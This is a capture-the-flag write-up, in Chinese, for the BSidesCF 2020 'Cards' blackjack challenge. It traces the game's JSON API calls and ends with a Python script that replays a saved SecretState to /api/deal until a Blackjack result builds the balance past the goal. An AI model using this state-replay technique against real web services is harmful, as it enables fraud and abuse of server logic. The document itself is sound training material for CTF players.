# \[BSidesCF 2020]Cards

## \[BSidesCF 2020]Cards

## 考点

* 请求逻辑分析

## wp

是一个21点的游戏，一开始有1000，要赢到100000

首先，打开游戏，会先向/api发送POST请求，获取一段json，保存用户信息

```
{"SecretState":"enc1","PlayerHand":[],"DealerHand":[],"Balance":1000,"GameState":"Idle","SessionState":"Playing","Bet":0}
```

/api/config发送POST请求，返回题目配置信息，然后下注进行游戏

```
{"Goal":100000,"MinBet":10,"MaxBet":500,"GameHandler":"/game.go","DeckHandler":"/deck.go"}
```

1、点击Deal向/api/deal发送POST

```
{"Bet":500,"SecretState":"enc1"}
```

然后返回的内容是手牌信息，这时会返回一个新的SecretState

```
{"SecretState":"enc2","PlayerHand":[["7","Spades"],["8","Spades"]],"DealerHand":[["X","X"],["4","Clubs"]],"Balance":500,"GameState":"Playing","SessionState":"Playing","Bet":500}
```

2、点击Hit，向/api/hit发送POST请求

```
{"SecretState":"enc2"}
```

返回

```
{"SecretState":"enc3","PlayerHand":[["7","Spades"],["8","Spades"],["2","Clubs"]],"DealerHand":[["X","X"],["4","Clubs"]],"Balance":500,"GameState":"Playing","SessionState":"Playing","Bet":0}
```

3、点击Stand，向/api/stand发送POST请求

```
{"SecretState":"enc3"}
```

判定是玩家赢，返回新的SecretState，并且把钱加上

```
{"SecretState":"enc4","PlayerHand":[["7","Spades"],["8","Spades"],["2","Clubs"]],"DealerHand":[["King","Spades"],["4","Clubs"],["Queen","Hearts"]],"Balance":1500,"GameState":"PlayerWins","SessionState":"Playing","Bet":0}
```

4、点击Deal，向/api/deal发送POST

```
{"Bet":500,"SecretState":"enc4"}
```

返回

```
{"SecretState":"enc5","PlayerHand":[["6","Spades"],["8","Clubs"]],"DealerHand":[["X","X"],["King","Diamonds"]],"Balance":1000,"GameState":"Playing","SessionState":"Playing","Bet":500}
```

5、点击Stand，向/api/stand发送POST请求

```
{"SecretState":"enc5"}
```

返回

```
{"SecretState":"enc6","PlayerHand":[["6","Spades"],["8","Clubs"]],"DealerHand":[["7","Spades"],["King","Diamonds"]],"Balance":1000,"GameState":"DealerWins","SessionState":"Playing","Bet":0}
```

6、再点击Deal，向/api/deal发送POST

```
{"Bet":500,"SecretState":"enc6"}
```

返回

```
{"SecretState":"enc7","PlayerHand":[["9","Spades"],["Queen","Diamonds"]],"DealerHand":[["X","X"],["Jack","Hearts"]],"Balance":500,"GameState":"Playing","SessionState":"Playing","Bet":500}
```

7、点击Stand，向/api/stand发送POST请求

```
{"SecretState":"enc7"}
```

返回

```
{"SecretState":"enc8","PlayerHand":[["9","Spades"],["Queen","Diamonds"]],"DealerHand":[["9","Diamonds"],["Jack","Hearts"]],"Balance":1000,"GameState":"Push","SessionState":"Playing","Bet":0}
```

8、点击Deal，向/api/deal发送POST

```
{"SecretState":"enc8"}
```

返回

```
{"SecretState":"enc9","PlayerHand":[["Queen","Hearts"],["Ace","Spades"]],"DealerHand":[["7","Hearts"],["4","Hearts"]],"Balance":1750,"GameState":"Blackjack","SessionState":"Playing","Bet":500}
```

这里的GameState变成了Blackjack，并且余额直接增加了，是1750

如果把enc9作为SecretState，向/api/deal进行重放，直到返回包出现Blackjack，这时会增加金币为2000，返回包的SecretState为enc10，再把enc10作为SecretState，向/api/deal进行重放，这样重复下去，最后余额就会满足条件

至此逻辑就清楚了

```python
import requests
import time
start = "http://19ce24e9-5867-491a-a5b4-a646ca88a0fe.node4.buuoj.cn:81/api"
deal = start + "/deal"
 
 
state = requests.post(start).json()["SecretState"]
 
while True:
    time.sleep(0.3)
    resp = requests.post(deal, json={"Bet": 500, "SecretState": state}).json()
 
    if resp['GameState'] == 'Blackjack':
        state = resp['SecretState']
 
    print(resp['Balance'])
    if resp['Balance'] > 100000:
        print(resp)
        break
```

## 小结

Link

[https://blog.csdn.net/qq\_46263951/article/details/119811028](https://blog.csdn.net/qq\_46263951/article/details/119811028)
